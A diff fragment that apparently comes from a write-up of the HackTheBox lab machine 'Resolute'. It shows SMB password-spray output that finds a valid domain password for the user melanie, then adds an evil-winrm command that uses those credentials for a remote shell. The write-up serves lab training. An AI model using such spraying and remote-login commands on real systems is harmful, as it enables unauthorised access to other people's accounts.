@@ -146,3 +146,9 @@ SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welco
 SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
 SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
 {% endhighlight %}
+
+Now we know that password fits to melanie user and we can WinRM to it.
+
+{% highlight shell %}
+evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'
+{% endhighlight %}
